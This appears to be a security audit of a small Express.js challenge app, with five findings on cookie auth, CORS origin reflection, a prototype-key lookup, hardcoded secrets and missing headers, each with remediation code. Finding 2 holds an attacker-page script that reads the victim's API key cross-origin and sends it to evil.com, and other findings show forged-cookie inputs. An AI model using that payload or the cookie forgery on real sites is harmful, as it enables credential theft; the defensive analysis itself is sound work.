## Pass 1 — Attack Surface Map

**Entry points:**
- `GET /mock-login` — sets `auth` cookie; no credential check
- `GET /api-key` — reads `auth` cookie value as a username key, returns API key

**Trust boundaries:**
- `req.cookies.auth` — fully attacker-controlled string (unsigned, unverified)
- `req.get('Origin')` — fully attacker-controlled HTTP header
- `users` object — static in-process data (treated as sensitive)

**Sensitive operations:**
- CORS middleware reflects `Origin` header with `Access-Control-Allow-Credentials: true`
- Cookie value used directly as object lookup key → API key returned
- Cookie has `SameSite: None` enabling cross-site cookie delivery

## Finding 1: Unsigned Authentication Cookie — Direct Auth Bypass

**File:** `main.js`  
**Lines:** 26–28, 31–38  
**CWE:** CWE-565 — Reliance on Cookies Without Validation and Integrity Check  
**OWASP Category:** A07:2021 – Identification and Authentication Failures  
**Priority:** P1  
**Severity:** CRITICAL  
**Confidence:** HIGH

### Vulnerable Code
```javascript
app.get('/mock-login', (req, res) => {
    res.cookie('auth', users.admin.username, { httpOnly: true, secure: true, sameSite: "none"});
    return res.status(200).json({ message: 'Login successful!' });;
});

app.get('/api-key', (req, res) => {
    const username = req.cookies.auth;

    if (username && users[username]) {
        return res.status(200).json({ data: users[username].apiKey });
    }
```

### Description
The `auth` cookie contains only the raw username string `"admin"` with no cryptographic signature or integrity protection. The `httpOnly` and `secure` flags only prevent JavaScript theft and non-HTTPS transmission respectively — they impose no verification burden on the server. Any client can send `Cookie: auth=admin` and the server will accept it as authenticated, returning the API key. The `get-api-key.req` test file itself demonstrates this: it manually sets `Cookie: auth=admin` with no prior login. This is authentication by plaintext assertion.

### Prioritization
Highest priority. This is a zero-precondition authentication bypass: no victim interaction, no network position, no race condition required. An attacker simply sets the cookie value to any known username.

### Exploitability Notes
- **Exploit Preconditions:** Knowledge of a valid username (e.g., `admin` — visible in source). Ability to set arbitrary cookie headers (any HTTP client or browser DevTools).
- **Uncertainty Boundary:** None. The exploit works as stated against any client making a direct request.

### Remediation
Use Express's built-in signed-cookie support. `cookie-parser` already supports this — the server signs each cookie value with an HMAC and rejects unsigned or tampered values at the middleware layer.

```javascript
// Initialize with a secret
app.use(cookieParser(process.env.COOKIE_SECRET)); // e.g. 32+ bytes random

// On login: issue a signed cookie
app.get('/mock-login', (req, res) => {
    res.cookie('auth', users.admin.username, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',  // see Finding 2
        signed: true         // HMAC-protected
    });
    return res.status(200).json({ message: 'Login successful!' });
});

// On protected route: verify the signed cookie
app.get('/api-key', (req, res) => {
    const username = req.signedCookies.auth; // false if tampered
    if (username && Object.hasOwn(users, username)) {
        return res.status(200).json({ data: users[username].apiKey });
    }
    return res.status(403).json({ message: 'Unauthorized access!' });
});
```

**Counterfactual invalidation:** If the cookie were issued with `signed: true` and the endpoint read `req.signedCookies.auth`, a tampered or forged cookie would return `false`, making this finding invalid.

- [CWE-565](https://cwe.mitre.org/data/definitions/565.html)

## Finding 2: CORS Origin Reflection with Credentials Enabled

**File:** `main.js`  
**Lines:** 16–23  
**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains  
**OWASP Category:** A05:2021 – Security Misconfiguration  
**Priority:** P1  
**Severity:** HIGH  
**Confidence:** HIGH

### Vulnerable Code
```javascript
app.use((req, res, next) => {
    const origin = req.get('Origin');
    if (origin) {
        res.header('Access-Control-Allow-Origin', origin); 
        res.header('Access-Control-Allow-Credentials', 'true'); 
    }
    next();
});
```

### Description
The CORS middleware reflects the attacker-controlled `Origin` request header verbatim into `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true`. This is the canonical high-priority CORS misconfiguration: any origin is effectively trusted, and the browser will include cookies on cross-origin requests and expose the response body to the requesting JavaScript. Combined with the `SameSite: None` cookie attribute (line 27), which explicitly allows the `auth` cookie to be sent cross-site, an attacker-controlled page can use `fetch(..., {credentials: 'include'})` to trigger an authenticated request from any victim's browser and read back the API key.

### Prioritization
Second-highest priority (slightly below Finding 1 which requires no victim interaction). This attack requires a victim to visit an attacker-controlled origin while holding a valid session, but the impact is full API key exfiltration.

### Exploitability Notes
- **Exploit Preconditions:** Victim must be authenticated (holds valid `auth` cookie). Victim must visit or be redirected to the attacker's page. Attacker controls any HTTPS origin (or localhost for same-device attacks).
- **Uncertainty Boundary:** Exploit assumes the browser respects CORS semantics (all modern browsers do). No server-side runtime variables affect this.

**Concrete attacker-controlled input:**
```
Origin: https://evil.com
```
Response:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Attacker page payload:**
```html
<!-- hosted on https://evil.com -->
<script>
fetch('https://target:3000/api-key', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://evil.com/collect?k=' + d.data));
</script>
```

### Remediation
Replace the reflective middleware with a strict allowlist. Change `SameSite` to `strict` or `lax` to prevent the cookie from traveling cross-site (coordinate with Finding 1 fix).

```javascript
const ALLOWED_ORIGINS = new Set([
    'https://www.yourdomain.com',
    'https://app.yourdomain.com'
]);

app.use((req, res, next) => {
    const origin = req.get('Origin');
    if (origin && ALLOWED_ORIGINS.has(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Credentials', 'true');
        res.header('Vary', 'Origin'); // required for correct caching
    }
    next();
});
```

**Counterfactual invalidation:** If the middleware checked `ALLOWED_ORIGINS.has(origin)` before reflecting, arbitrary origins would receive no CORS grant and the cross-origin read would be blocked by the browser.

- [PortSwigger CORS Vulnerabilities](https://portswigger.net/web-security/cors)
- [CWE-942](https://cwe.mitre.org/data/definitions/942.html)

## Finding 3: Unvalidated Object Property Key from Cookie (Prototype Chain Bypass)

**File:** `main.js`  
**Lines:** 32–37  
**CWE:** CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes  
**OWASP Category:** A01:2021 – Broken Access Control  
**Priority:** P2  
**Severity:** MEDIUM  
**Confidence:** HIGH

### Vulnerable Code
```javascript
const username = req.cookies.auth;

if (username && users[username]) {
    return res.status(200).json({ data: users[username].apiKey });
}
```

### Description
The cookie value is used directly as a property key on the `users` object without verifying it is an own property. In JavaScript, `users['__proto__']` evaluates to `Object.prototype` (truthy), causing the condition to pass for an attacker-supplied value of `__proto__`. The code then reads `Object.prototype.apiKey` which is `undefined`, so no secret is leaked — but the endpoint returns HTTP 200 with `{}` instead of 403 Unauthorized. This bypass also applies to `constructor` and `toString`. If any future code pollutes `Object.prototype.apiKey` (or a dependency does), the check would expose that value. The correct guard is `Object.hasOwn(users, username)`.

### Prioritization
P2 behind Findings 1 and 2. Direct impact is limited to 200-vs-403 response code confusion in the current code, but the pattern creates fragile security logic.

### Exploitability Notes
- **Exploit Preconditions:** Attacker can set `Cookie: auth=__proto__` (easy given unsigned cookie from Finding 1). Server must be running Node.js (V8's `__proto__` accessor).
- **Uncertainty Boundary:** No secret is exposed in the current code unless `Object.prototype` is polluted by another dependency.

### Remediation
```javascript
const username = req.cookies.auth;

if (username && Object.hasOwn(users, username)) {
    return res.status(200).json({ data: users[username].apiKey });
}

return res.status(403).json({ message: 'Unauthorized access!' });
```

`Object.hasOwn` (Node ≥ 16.9) or `Object.prototype.hasOwnProperty.call(users, username)` ensures only explicitly defined user entries are accepted.

### References
- [CWE-915](https://cwe.mitre.org/data/definitions/915.html)
- [MDN Object.hasOwn()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn)

## Finding 4: Sensitive Data Hardcoded in Source

**File:** `main.js`  
**Lines:** 9–14  
**CWE:** CWE-798 — Use of Hard-coded Credentials  
**OWASP Category:** A02:2021 – Cryptographic Failures  
**Priority:** P2  
**Severity:** LOW  
**Confidence:** LOW

### Vulnerable Code
```javascript
const users = {
  admin: {
    username: 'admin',
    apiKey: '<some-secret-API-key>'
  }
};
```

### Description
An API key is embedded directly in source code. The code comment acknowledges this is a challenge placeholder (`"For the sake of the challenge..."`), lowering confidence that a real secret is present. However, the code structure demonstrates the dangerous pattern: if a real API key replaced the placeholder, every developer, CI runner, and repository viewer would have access to it. Real secrets must never be hardcoded; they must be loaded at runtime from environment variables or a secrets manager and must never appear in version control.

### Prioritization
P2. Low confidence that a real secret is present (placeholder string). In a production codebase this pattern would be HIGH severity.

### Exploitability Notes
- **Exploit Preconditions:** Access to the source code repository.
- **Uncertainty Boundary:** The placeholder value `'<some-secret-API-key>'` is not itself a usable credential.

### Remediation
```javascript
// Load from environment at startup — never commit actual values
const users = {
    admin: {
        username: 'admin',
        apiKey: process.env.ADMIN_API_KEY  // set via secrets manager / .env (gitignored)
    }
};

// Fail fast if required secrets are absent
if (!users.admin.apiKey) {
    throw new Error('ADMIN_API_KEY environment variable is required');
}
```

### References
- [CWE-798](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

## Finding 5: Missing HTTP Security Headers

**File:** `main.js`  
**Lines:** 1–6  
**CWE:** CWE-16 — Configuration  
**OWASP Category:** A05:2021 – Security Misconfiguration  
**Priority:** P3  
**Severity:** INFO  
**Confidence:** HIGH

### Vulnerable Code
```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
```

### Description
The application uses no security header middleware. Express does not set `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Content-Security-Policy` by default. While these are defense-in-depth controls with lower direct exploitability, their absence means the app is missing the browser-side mitigations that limit clickjacking, MIME-sniffing, and downgrade attacks.

### Prioritization
P3. Low standalone exploitability — Findings 1 and 2 are the dominant risks.

### Exploitability Notes
- **Exploit Preconditions:** Depends on specific header; clickjacking requires a framed page.
- **Uncertainty Boundary:** Impact of missing HSTS depends on whether TLS termination happens upstream.

### Remediation
```bash
npm install helmet
```
```javascript
const helmet = require('helmet');
app.use(helmet()); // sets X-Frame-Options, X-Content-Type-Options, HSTS, CSP, and more
```

### References
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Helmet.js](https://helmetjs.github.io/)
